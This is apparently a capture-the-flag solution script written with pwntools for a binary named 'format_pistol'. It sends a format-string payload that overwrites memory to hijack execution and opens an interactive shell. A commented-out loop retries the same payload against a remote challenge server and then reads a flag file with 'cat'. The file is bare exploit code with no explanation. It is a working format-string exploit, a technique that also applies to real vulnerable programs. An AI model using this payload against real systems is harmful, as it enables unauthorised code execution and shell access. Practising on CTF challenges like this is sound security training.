from pwn import *

io = process('./format_pistol')
gdb.attach(io, api=True)
# while(1):
#     io = remote('pwn.h4ckingga.me', 10009)
#     io.sendline(b'%37c%*21$p%7$n')
#     time.sleep(2)
#     try:
#         io.sendline(b'cat /home/pwn/flag')
#         print(io.recvline())
#         break
#     except:
#         io.close()
# io.interactive()

io.sendline(b'%37c%*21$p%7$n')
io.interactive()